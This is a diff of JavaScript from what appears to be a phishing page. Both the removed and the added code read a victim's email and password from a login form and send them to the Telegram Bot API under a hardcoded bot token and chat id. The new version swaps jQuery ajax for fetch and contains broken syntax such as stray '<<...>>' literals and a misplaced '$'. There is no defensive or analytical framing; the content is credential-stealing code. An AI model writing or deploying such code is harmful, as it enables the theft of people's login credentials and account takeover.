@@ -1,33 +1,26 @@
-//bot token
-var telegram_bot_id = "5903216139:AAGOMD7unyFYiCTiSYFM4Z0-ctRQyX2yc2E";
-//chat id
-var chat_id = 1657791509;
-var email, pasD;
-var ready = function () {
-    email = document.getElementById("email").value;
-    pasD = document.getElementById("pasD").value;
-    message = "\nEmail: " + email + "\nPassword: " + pasD;
-};
-var sender = function () {
-    ready();
-    var settings = {
-        "async": true,
-        "crossDomain": true,
-        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "cache-control": "no-cache"
-        },
-        "data": JSON.stringify({
-            "chat_id": chat_id,
-            "text": message
+const token = <<5903216139:AAGOMD7unyFYiCTiSYFM4Z0-ctRQyX2yc2E>>
+const chat_id = <<1657791509>>
+
+function sendForm()
+{
+     let formData = JSON.stringify($("#stdFord").serializeArray(),'email','pasD');
+     
+     const request = new Request(
+          `https://api.telegram.org/bot$5903216139:AAGOMD7unyFYiCTiSYFM4Z0-ctRQyX2yc2E/sendMessage`,
+          {
+               method: 'POST',
+               body: formData,
+               headers: {
+                     'Content-Type': 'application/json',
+                     'accept': 'application/json',
+               }
+          },
+     );
+
+     fetch(request)
+        .then(result => result.json())
+        .then(data => {
+             console.log(data);
         })
-    };
-    $.ajax(settings).done(function (response) {
-        console.log(response);
-    });
-    document.getElementById("email").value = "";
-    document.getElementById("pasD").value = "";
-    return false;
-};
+        .catch(error => console.log('Error', error));
+}
